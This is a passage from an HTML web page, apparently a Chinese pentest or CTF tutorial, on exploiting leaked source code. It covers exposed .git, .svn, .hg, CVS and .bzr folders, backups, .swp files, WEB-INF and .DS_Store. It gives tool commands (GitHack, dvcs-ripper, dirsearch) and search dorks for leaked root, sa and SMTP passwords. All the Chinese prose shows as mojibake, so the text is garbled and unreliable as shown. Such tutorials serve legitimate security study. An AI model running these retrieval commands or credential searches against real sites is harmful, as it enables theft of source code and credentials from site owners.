<br></code></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿæœ‰ä¸€äº›è‡ªåŠ¨åŒ–åˆ©ç”¨çš„è„šæœ¬ ã€‚</p><p><strong>æ¼æ´åˆ©ç”¨å·¥å…·ï¼š</strong></p><p><strong>1ã€GitHack</strong></p><p>GitHack æ˜¯ä¸€ä¸ª <code>.git</code> æ³„éœ²åˆ©ç”¨å·¥å…·ï¼Œå¯è¿˜åŸå†å²ç‰ˆæœ¬ ã€‚</p><p>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a> ï¼ˆåªæ˜¯ä¸‹è½½ï¼Œæ— æ³•è¿›è¡Œç‰ˆæœ¬åˆ‡æ¢å’Œè´®å­˜å¼¹å‡ºï¼‰</p><p>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a> ï¼ˆåˆå§‹ç›®å½•æ˜¯æ— æ–‡ä»¶çš„ï¼‰</p><p>ç”¨æ³•ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python2 GitHack.py http://www.example.com/.git/</span><br></code></pre></td></tr></table></figure><p><strong>2ã€Scrabble</strong></p><p>å¯è¿›è¡Œç‰ˆæœ¬åˆ‡æ¢ï¼Œæ— æ³•è¿›è¡Œè´®å­˜å¼¹å‡º</p><p>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/denny0223/scrabble">https://github.com/denny0223/scrabble</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> ./scrabble http://example.com/</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼šæºç ä¸‹è½½å¯èƒ½ä¼šè¦†ç›–æ‰€åœ¨ç›®å½•çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æœ€å¥½åœ¨ç©ºç›®å½•ä¸‹ä½¿ç”¨ ã€‚</p><p><strong>3ã€dvcs-ripper</strong></p><p>githubé¡¹ç›®åœ°å€ï¼š <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p><p>ç”¨æ³•ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> perl rip-git.pl -s -v -u http://www.example.com/.git/</span><br></code></pre></td></tr></table></figure><h2 id="SVNæºç æ³„éœ²"><a href="#SVNæºç æ³„éœ²" class="headerlink" title="SVNæºç æ³„éœ²"></a>SVNæºç æ³„éœ²</h2><p>SVN æ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç çš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿã€‚åœ¨ä½¿ç”¨ SVN ç®¡ç†æœ¬åœ°ä»£ç è¿‡ç¨‹ä¸­ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåä¸º <code>.svn</code> çš„éšè—æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­åŒ…å«é‡è¦çš„æºä»£ç ä¿¡æ¯ã€‚ç½‘ç«™ç®¡ç†å‘˜åœ¨å‘å¸ƒä»£ç æ—¶ï¼Œæ²¡æœ‰ä½¿ç”¨ â€œå¯¼å‡ºâ€ åŠŸèƒ½ï¼Œè€Œæ˜¯ç›´æ¥å¤åˆ¶ä»£ç æ–‡ä»¶å¤¹åˆ° WEB æœåŠ¡å™¨ä¸Šï¼Œè¿™å°±ä½¿ <code>.svn</code> éšè—æ–‡ä»¶å¤¹è¢«æš´éœ²äºå¤–ç½‘ç¯å¢ƒï¼Œå¯ä»¥åˆ©ç”¨ <code>.svn/entries</code> æ–‡ä»¶ï¼Œè·å–åˆ°æœåŠ¡å™¨æºç ã€‚</p><p><strong>åˆ©ç”¨æ–¹æ³•ï¼š</strong></p><p>åŒæ ·æ˜¯å…ˆä¸‹è½½ç›®å½•, ç„¶åå›æ»šï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> wget -r --no-parent --mirror http://www.example.com/.svn</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">cd</span> www.example.com &amp;&amp; svn revert --recursive .</span> <br></code></pre></td></tr></table></figure><p><strong>æ¼æ´åˆ©ç”¨å·¥å…·ï¼š</strong></p><p><strong>1ã€Seay-SVN</strong></p><p>æ³•å¸ˆçš„å·¥å…·ï¼ŒåŸºäº Windows å¹³å°</p><p><strong>2ã€dvcs-ripper</strong></p><p>æ”¯æŒæ—§ç‰ˆå’Œæ–°ç‰ˆçš„ svn ã€‚</p><p>githubé¡¹ç›®åœ°å€ï¼š <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p><p>ç”¨æ³•ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> perl rip-svn.pl -v -u http://www.example.com/.svn/</span><br></code></pre></td></tr></table></figure><h2 id="HGæºç æ³„æ¼"><a href="#HGæºç æ³„æ¼" class="headerlink" title="HGæºç æ³„æ¼"></a>HGæºç æ³„æ¼</h2><p>Mercurial æ˜¯ä¸€ç§è½»é‡çº§åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œä½¿ç”¨ <code>hg init</code> çš„æ—¶å€™ä¼šç”Ÿæˆ <code>.hg</code> ã€‚</p><p><strong>åˆ©ç”¨æ–¹æ³•ï¼š</strong></p><p>ä¸‹è½½ + å›æ»šï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> wget -r --no-parent --mirror http://www.example.com/.hg</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">cd</span> www.example.com &amp;&amp; hg revert</span> <br></code></pre></td></tr></table></figure><p><strong>æ¼æ´åˆ©ç”¨å·¥å…·ï¼š dvcs-ripper</strong><br>githubé¡¹ç›®åœ°å€ï¼š <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p><p>ç”¨æ³•ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> perl rip-hg.pl -v -u http://www.example.com/.hg/</span><br></code></pre></td></tr></table></figure><h2 id="CVSæ³„éœ²"><a href="#CVSæ³„éœ²" class="headerlink" title="CVSæ³„éœ²"></a>CVSæ³„éœ²</h2><p>CVS æ˜¯ä¸€ä¸ª C/S ç³»ç»Ÿï¼Œå¤šä¸ªå¼€å‘äººå‘˜é€šè¿‡ä¸€ä¸ªä¸­å¿ƒç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæ¥è®°å½•æ–‡ä»¶ç‰ˆæœ¬ï¼Œä»è€Œè¾¾åˆ°ä¿è¯æ–‡ä»¶åŒæ­¥çš„ç›®çš„ã€‚ä¸»è¦æ˜¯é’ˆå¯¹ <code>CVS/Root</code> ä»¥åŠ <code>CVS/Entries</code> ç›®å½•ï¼Œåˆ†åˆ«è®°å½•äº†é¡¹ç›®çš„æ ¹ä¿¡æ¯å’Œæ‰€æœ‰æ–‡ä»¶çš„ç»“æ„ï¼Œç›´æ¥å°±å¯ä»¥çœ‹åˆ°æ³„éœ²çš„ä¿¡æ¯ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">http://url/CVS/Root</span>    <span class="hljs-comment">#è¿”å›æ ¹ä¿¡æ¯ </span><br><span class="hljs-string">http://url/CVS/Entries</span> <span class="hljs-comment">#è¿”å›æ‰€æœ‰æ–‡ä»¶çš„ç»“æ„</span><br></code></pre></td></tr></table></figure><p><strong>åˆ©ç”¨æ–¹æ³•ï¼š</strong></p><p>ä¸‹è½½ CVS æ–‡ä»¶å¤¹ç„¶åé€šè¿‡ cvs å‘½ä»¤è·å–æºç ä¿¡æ¯ï¼Œä¸è¿‡ä¼¼ä¹æ²¡æœ‰ç›´æ¥çš„å›æ»šæ“ä½œï¼Œéœ€è¦åšç‚¹é¢å¤–çš„å¤„ç† ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> wget -r --no-parent --mirror http://www.example.com/CVS</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">cd</span> www.example.com &amp;&amp; cvs diff *</span> <br></code></pre></td></tr></table></figure><p><strong>æ¼æ´åˆ©ç”¨å·¥å…·ï¼šdvcs-ripper</strong><br>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/kost/dvcs-ripper.git">https://github.com/kost/dvcs-ripper.git</a></p><p>è¿è¡Œç¤ºä¾‹:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> perl rip-cvs.pl -v -u http://www.example.com/CVS/</span><br></code></pre></td></tr></table></figure><h2 id="Bazaar-bzræ³„éœ²"><a href="#Bazaar-bzræ³„éœ²" class="headerlink" title="Bazaar/bzræ³„éœ²"></a>Bazaar/bzræ³„éœ²</h2><p>bzr ä¹Ÿæ˜¯ä¸ªç‰ˆæœ¬æ§åˆ¶å·¥å…·, è™½ç„¶ä¸æ˜¯å¾ˆçƒ­é—¨, ä½†å®ƒä¹Ÿæ˜¯å¤šå¹³å°æ”¯æŒ, å¹¶ä¸”æœ‰ä¸é”™çš„å›¾å½¢ç•Œé¢ã€‚</p><p><strong>åˆ©ç”¨æ–¹æ³•ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> wget -r --no-parent --mirror http://www.example.com/.bzr</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">cd</span> www.example.com &amp;&amp; bzr revert</span><br></code></pre></td></tr></table></figure><p><strong>æ¼æ´åˆ©ç”¨å·¥å…·ï¼šdvcs-ripper</strong><br>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/kost/dvcs-ripper.git">https://github.com/kost/dvcs-ripper.git</a></p><p>è¿è¡Œç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> perl rip-bzr.pl -v -u http://www.example.com/.bzr/</span><br></code></pre></td></tr></table></figure><h2 id="å¤‡ä»½æ–‡ä»¶æ³„éœ²"><a href="#å¤‡ä»½æ–‡ä»¶æ³„éœ²" class="headerlink" title="å¤‡ä»½æ–‡ä»¶æ³„éœ²"></a>å¤‡ä»½æ–‡ä»¶æ³„éœ²</h2><p>å¤‡ä»½æ–‡ä»¶æ³„éœ²åˆåˆ†ä¸ºä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯è¿ç»´äººå‘˜å·æ‡’åœ°ç›´æ¥åœ¨ç½‘ç«™æ ¹ç›®å½•ç”¨ç±»ä¼¼ <code>tar -czvf bakup.tgz *</code> çš„å‘½ä»¤å°†ç½‘ç«™è¿›è¡Œå¤‡ä»½ï¼Œè¿™æ ·æ•´ç«™çš„æºä»£ç éƒ½èƒ½ç›´æ¥è¢«ç”¨æˆ·æ‰“åŒ…ä¸‹è½½äº†ï¼›å¦ä¸€ç§æ˜¯å¼€å‘æˆ–è€…è¿ç»´äººå‘˜ä½¿ç”¨çš„ç¼–è¾‘å™¨ä¿®æ”¹æ–‡ä»¶æ—¶è‡ªåŠ¨å¤‡ä»½äº†æ‰€ç¼–è¾‘çš„ç½‘é¡µå†…å®¹ï¼Œå¦‚ vim çš„ <code>.swp</code> ï¼Œä»è€Œæ³„éœ²äº†è¯¥ç½‘é¡µçš„æºä»£ç  ã€‚</p><p><strong>å¸¸è§çš„å¤‡ä»½æ–‡ä»¶åç¼€ï¼š</strong></p><ul><li>.rar</li><li>.zip</li><li>.7z</li><li>.tar.gz</li><li>.bak</li><li>.swp</li><li>.txt</li><li>.html</li><li>.old</li><li>.temp</li></ul><p><strong>gedit</strong></p><p>Linux ä¸‹ç”¨ gedit ç¼–å†™æ–‡ä»¶å¹¶ä¿å­˜åä¼šç”Ÿæˆä¸€ä¸ªæ–‡ä»¶åæ ¼å¼ä¸º <code>åŸæ–‡ä»¶å~</code> çš„å¤‡ä»½æ–‡ä»¶ ã€‚</p><p><strong>vim</strong></p><p>å½“ä½¿ç”¨ vim ç¼–è¾‘æ–‡ä»¶ç¬¬ä¸€æ¬¡æ„å¤–é€€å‡ºæ—¶ä¼šç”Ÿæˆä¸€ä¸ªæ–‡ä»¶åæ ¼å¼ä¸º <code>.æ–‡ä»¶å.swp</code> çš„å¤‡ä»½æ–‡ä»¶ï¼Œå¯ä½¿ç”¨ <code>vim -r æ–‡ä»¶å</code> æ¥æ¢å¤ï¼Œç¬¬äºŒæ¬¡æ„å¤–é€€å‡ºä¸º <code>.swo</code>ï¼Œç¬¬ä¸‰æ¬¡ä¸º <code>.swn</code> ã€‚</p><p><strong>å¸¸è§„æ–‡ä»¶</strong></p><p><code>robots.txt</code>ï¼šæ•æ„Ÿç›®å½•å’Œ CMS ç‰ˆæœ¬ä¿¡æ¯<br><code>readme.md</code>ï¼šCMS ç‰ˆæœ¬ä¿¡æ¯ï¼Œgithub åœ°å€<br><code>www.zip/rar/tar.gz</code>ï¼šç½‘ç«™å¤‡ä»½æºç </p><p><strong>åˆ©ç”¨æ–¹æ³•ï¼š</strong></p><p>å¯¹äºæ‰“åŒ…æ–‡ä»¶è€Œè¨€ï¼Œå¯ä»¥ç”¨ <code>&#123;å¸¸ç”¨æ–‡ä»¶å&#125; + &#123;å¸¸ç”¨å‹ç¼©åŒ…åç¼€&#125;</code> çš„æ–¹å¼æ‰«æç½‘ç«™ï¼Œè¯´ä¸å®šä¼šæœ‰æ„å¤–æƒŠå–œã€‚å¯¹äºç½‘é¡µçš„ä¸´æ—¶å¤‡ä»½æ–‡ä»¶ï¼Œå¯ä»¥æ‰«æå¯¹åº”é¡µé¢çš„ <code>.swp</code> æˆ–è€… <code>.bak</code> ç­‰åç¼€ï¼Œè¯´ä¸å®šä¹Ÿèƒ½æ‰¾åˆ°æœ‰ç”¨çš„ä¿¡æ¯ ã€‚</p><p><strong>æ¼æ´åˆ©ç”¨å·¥å…·ï¼š</strong></p><p><strong>1ã€disearch</strong></p><p>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><p>ç”¨æ³•ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python3 dirsearch.py -u URL -e extension</span><br></code></pre></td></tr></table></figure><p><strong>2ã€å¾¡å‰‘</strong></p><h2 id="SWP-æ–‡ä»¶æ³„éœ²"><a href="#SWP-æ–‡ä»¶æ³„éœ²" class="headerlink" title="SWP æ–‡ä»¶æ³„éœ²"></a>SWP æ–‡ä»¶æ³„éœ²</h2><p><code>swp</code> å³ <code>swap</code> æ–‡ä»¶ï¼Œåœ¨ç¼–è¾‘æ–‡ä»¶æ—¶äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶ï¼Œå®ƒæ˜¯éšè—æ–‡ä»¶ï¼Œå¦‚æœç¨‹åºæ­£å¸¸é€€å‡ºï¼Œä¸´æ—¶æ–‡ä»¶è‡ªåŠ¨åˆ é™¤ï¼Œå¦‚æœæ„å¤–é€€å‡ºå°±ä¼šä¿ç•™ï¼Œæ–‡ä»¶åä¸º <code>.filename.swp</code> ã€‚</p><p>æ¼æ´åˆ©ç”¨ï¼šç›´æ¥è®¿é—® <code>.swp</code> æ–‡ä»¶ï¼Œä¸‹è½½å›æ¥ååˆ æ‰æœ«å°¾çš„ <code>.swp</code> ï¼Œè·å¾—æºç æ–‡ä»¶ã€‚</p><h2 id="é…ç½®æ–‡ä»¶æ³„éœ²"><a href="#é…ç½®æ–‡ä»¶æ³„éœ²" class="headerlink" title="é…ç½®æ–‡ä»¶æ³„éœ²"></a>é…ç½®æ–‡ä»¶æ³„éœ²</h2><p>ç°ä»£ WEB å¼€å‘å¾€å¾€ä¸ä¼šé‡æ–°é€ è½®å­ï¼Œè€Œæ˜¯åŸºäºæˆç†Ÿçš„æ¡†æ¶è¿›è¡Œé…ç½®ï¼Œå¦‚æœæ¸—é€æµ‹è¯•äººå‘˜çŸ¥é“è¯¥ç½‘ç«™æ˜¯åŸºäºä»€ä¹ˆç±»å‹çš„æ¡†æ¶ï¼Œå°±å¯èƒ½é€šè¿‡è¯¥æ¡†æ¶çš„æ–‡æ¡£è·å¾—é‡è¦é…ç½®æ–‡ä»¶çš„è·¯å¾„ï¼Œå¦‚æœæ˜¯å¼€æºæ¡†æ¶ï¼ŒåŒæ—¶ä¹Ÿèƒ½è·å¾—æºä»£ç ï¼Œå› æ­¤é…ç½®æ–‡ä»¶æ³„éœ²çš„ä¸¥é‡æ€§ä¹Ÿæ˜¯ä¸è¨€è€Œå–»çš„ ã€‚</p><p><strong>åˆ©ç”¨æ–¹æ³•ï¼š</strong></p><p>é€šè¿‡è¯†åˆ«ç½‘ç«™æŒ‡çº¹å¾—çŸ¥å…¶æ¡†æ¶ç±»å‹ï¼Œç„¶åæ‰‹å·¥æµ‹è¯•é‡è¦çš„é…ç½®æ–‡ä»¶æ˜¯å¦å¯ä»¥è·å–ã€‚å¦‚æœæ˜¯æ‰¹é‡æµ‹è¯•ï¼Œåˆ™å¯ä»¥äº‹å…ˆå‡†å¤‡å¥½ å¸¸è§çš„é…ç½®æ–‡ä»¶è·¯å¾„ï¼Œå¦‚ <code>wordpress</code> çš„ <code>/wp-config.php</code> ç­‰ï¼Œç»„ç»‡æˆ <code>å­—å…¸</code> ç„¶åç”¨è„šæœ¬è¿›è¡Œæ‰¹é‡æµ‹è¯•ã€‚<br>å¯ä»¥å‚è€ƒ <a href="https://github.com/ring04h/weakfilescan/blob/master/dict/configfile.lst">çŒªçŒªä¾ çš„å­—å…¸</a> ã€‚</p><h2 id="WEB-INF-web-xml-æ³„éœ²"><a href="#WEB-INF-web-xml-æ³„éœ²" class="headerlink" title="WEB-INF/web.xml æ³„éœ²"></a>WEB-INF/web.xml æ³„éœ²</h2><p><code>WEB-INF</code> æ˜¯ Java çš„ WEB åº”ç”¨çš„å®‰å…¨ç›®å½•ï¼Œå¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡ <code>web.xml</code> æ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</p><p><code>WEB-INF</code> ä¸»è¦åŒ…å«ä»¥ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">WEB-INF/web.xml:</span> <span class="hljs-string">Webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶,</span> <span class="hljs-string">æè¿°äº†servletå’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™</span><br><span class="hljs-attr">WEB-INF/database.properties:</span> <span class="hljs-string">æ•°æ®åº“é…ç½®æ–‡ä»¶</span><br><span class="hljs-attr">WEB-INF/classes/:</span> <span class="hljs-string">ä¸€èˆ¬ç”¨æ¥å­˜æ”¾Javaç±»æ–‡ä»¶(.class)</span><br><span class="hljs-attr">WEB-INF/lib/:</span> <span class="hljs-string">ç”¨æ¥å­˜æ”¾æ‰“åŒ…å¥½çš„åº“(.jar)</span><br><span class="hljs-attr">WEB-INF/src/:</span> <span class="hljs-string">ç”¨æ¥æ”¾æºä»£ç (.aspå’Œ.phpç­‰)</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡æ‰¾åˆ° <code>web.xml</code> æ–‡ä»¶ï¼Œæ¨æ–­ <code>class</code> æ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åå¾—åˆ° <code>class</code> æ–‡ä»¶ï¼Œå†é€šè¿‡åç¼–è¯‘ <code>class</code> æ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚</p><h2 id="DS-Store-æ–‡ä»¶æ³„éœ²"><a href="#DS-Store-æ–‡ä»¶æ³„éœ²" class="headerlink" title="DS_Store æ–‡ä»¶æ³„éœ²"></a>DS_Store æ–‡ä»¶æ³„éœ²</h2><p><code>.DS_Store</code> (Desktop Services Store) æ˜¯ macOS ç›®å½•ä¸‹çš„éšè—æ–‡ä»¶ï¼ŒåŒ…å«äº†å½“å‰ç›®å½•ç»“æ„å’Œä¸€äº›çš„è‡ªå®šä¹‰ä¿¡æ¯ï¼Œå¦‚èƒŒæ™¯å’Œå›¾æ ‡ä½ç½®ç­‰ï¼Œåœ¨ windows ä¸‹ç±»ä¼¼çš„æ–‡ä»¶ä¸º <code>desktop.ini</code> ã€‚æš´éœ²äº† <code>.DS_Store</code> æ–‡ä»¶ä¹Ÿå°±ç›¸å½“äºæš´éœ²äº†è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰å†…å®¹ã€‚é€šè¿‡ <code>.DS_Store</code> å¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚</p><p><strong>æ¼æ´åˆ©ç”¨å·¥å…·ï¼š</strong></p><p><strong>1ã€ds_store_exp</strong></p><p>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a> ï¼ˆæœ‰é—®é¢˜ï¼špython2-æ˜¾ç¤ºç¼ºå°‘åº“ï¼Œä½†å·²ç»è£…äº†ï¼›python3-æ˜¾ç¤ºæœ‰è¯­æ³•é”™è¯¯ï¼‰</p><p>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/meme-lord/ds_store_exp">https://github.com/meme-lord/ds_store_exp</a></p><p>ç”¨æ³•ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python ds_store_exp.py http://www.example.com/.DS_Store</span><br></code></pre></td></tr></table></figure><p><strong>2ã€Python-dsstore</strong></p><p>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/gehaxelt/Python-dsstore">https://github.com/gehaxelt/Python-dsstore</a></p><p>ç”¨æ³•ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python main.py DS_Store</span><br></code></pre></td></tr></table></figure><h2 id="GitHubæºç æ³„æ¼"><a href="#GitHubæºç æ³„æ¼" class="headerlink" title="GitHubæºç æ³„æ¼"></a>GitHubæºç æ³„æ¼</h2><p>GitHub æ˜¯ä¸€ä¸ªé¢å‘å¼€æºåŠç§æœ‰è½¯ä»¶é¡¹ç›®çš„æ‰˜ç®¡å¹³å°ã€‚å¾ˆå¤šäººå–œæ¬¢æŠŠè‡ªå·±çš„ä»£ç ä¸Šä¼ åˆ°å¹³å°æ‰˜ç®¡ï¼Œé€šè¿‡å…³é”®è¯è¿›è¡Œæœç´¢ï¼Œå¯ä»¥æ‰¾åˆ°å…³äºç›®æ ‡ç«™ç‚¹çš„æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥ä¸‹è½½ç½‘ç«™æºç ã€‚</p><p>ç±»ä¼¼çš„ä»£ç æ‰˜ç®¡å¹³å°è¿˜æœ‰å¾ˆå¤šï¼Œäººæ‰æ˜¯æœ€å¤§çš„æ¼æ´ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://github.com/search?q=smtp+user+@qq.com&amp;type=code<br></code></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">site:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Github</span>.</span></span>com smtp <br>site:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Github</span>.</span></span>com sa password<br>site:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Github</span>.</span></span>com root password<br>site:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Github</span>.</span></span>com User ID=&#x27;sa&#x27;;Password<br>site:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Github</span>.</span></span>com svn<br>site:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Github</span>.</span></span>com ftp<br></code></pre></td></tr></table></figure><h2 id="Bannerè¯†åˆ«"><a href="#Bannerè¯†åˆ«" class="headerlink" title="Bannerè¯†åˆ«"></a>Bannerè¯†åˆ«</h2><p>1ã€åˆ©ç”¨ CMS æŒ‡çº¹åº“ï¼š<a href="http://whatweb.bugscaner.com/">åœ¨çº¿è¯†åˆ«</a> ã€‚</p><p>2ã€åˆ©ç”¨å·²æœ‰å·¥å…· wappalyerï¼Œå¯ä»¥é€šè¿‡ python å®‰è£…åº“ï¼Œä¹Ÿå¯ä»¥åœ¨æµè§ˆå™¨è£…æ’ä»¶ ã€‚</p><p>3ã€è¿˜å¯ä»¥é€šè¿‡æŠ¥é”™ 404 å’Œ 302 æ¥æŸ¥çœ‹é”™è¯¯ä¿¡æ¯ ã€‚</p><h2 id="Windows-IIS-Apache-ç›®å½•ç©¿è¶Š"><a href="#Windows-IIS-Apache-ç›®å½•ç©¿è¶Š" class="headerlink" title="Windows IIS / Apache ç›®å½•ç©¿è¶Š"></a>Windows IIS / Apache ç›®å½•ç©¿è¶Š</h2><p>ç›®å½•ç©¿è¶Šæ¼æ´åŸç†æ¯”è¾ƒç®€å•ï¼Œç¨‹åºåœ¨å®ç°ä¸Šæ²¡æœ‰å……åˆ†è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„ <code>../</code> ä¹‹ç±»çš„ç›®å½•è·³è½¬ç¬¦ï¼Œå¯¼è‡´æ¶æ„ç”¨æˆ·å¯ä»¥è®¿é—® web æ ¹ç›®å½•çš„ä¸Šçº§ä»è€Œéå†æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚è™½ç„¶ web æœåŠ¡å™¨æœ¬èº«ä¼šç¦æ­¢è®¿é—® web æ–‡ä»¶å¤¹ä»¥å¤–çš„åœ°æ–¹ï¼Œä½†å¦‚æœæ˜¯æ™ºéšœå¼€å‘å¼•å…¥çš„åŠ¨æ€é¡µé¢ï¼Œåˆæ²¡æœ‰è¿‡æ»¤å¥½ç”¨æˆ·è¾“å…¥ï¼Œå°±å¯èƒ½ä¼šå‡ºç°ç©¿è¶Šç”šè‡³ç›®å½•éå†ã€‚ç”šè‡³ web æœåŠ¡å™¨æœ¬èº«ä¹Ÿæ›¾ç»æœ‰ç±»ä¼¼çš„æ¼æ´ï¼Œæ¯”å¦‚ Apache Tomcat çš„ UTF-8 è§£ææ¼æ´ï¼Œå…·ä½“åˆ©ç”¨å’Œç»•è¿‡å¯ä»¥å‚è€ƒ <a href="https://zhuanlan.zhihu.com/p/21516413">å…¶ä»–ç½‘ä¸Šçš„æ–‡ç« </a> ï¼Œè¿™é‡Œé™äºç¯‡å¹…å°±ä¸å±•å¼€äº† ã€‚</p><h2 id="Nginxé…ç½®å®‰å…¨"><a href="#Nginxé…ç½®å®‰å…¨" class="headerlink" title="Nginxé…ç½®å®‰å…¨"></a>Nginxé…ç½®å®‰å…¨</h2><p>Nginx çš„é…ç½®é€‰é¡¹ä¹‹å¤šï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰äººéƒ½èƒ½ç†Ÿæ‚‰ï¼Œä½†ä¸è¡¨ç¤ºéšä¾¿ç™¾åº¦ä¸€ä¸‹å¤åˆ¶ç²˜è´´å°±é…ç½®äº†ï¼Œæœ€å¥½è¿˜æ˜¯å…ˆçœ‹ä¸‹å®˜æ–¹æ–‡æ¡£å¯¹åº”é€‰é¡¹çš„ä½œç”¨å’Œç”¨æ³•ï¼Œå¯ä»¥é¿å…è®¸å¤šè‡´å‘½çš„é”™è¯¯ã€‚ä¾‹å¦‚ Nginx 